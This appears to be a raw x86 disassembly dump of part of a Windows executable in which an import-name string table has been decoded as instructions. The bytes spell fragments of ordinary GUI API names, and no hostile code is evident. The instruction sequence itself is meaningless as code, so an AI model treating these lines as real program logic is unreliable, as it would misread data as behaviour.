  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
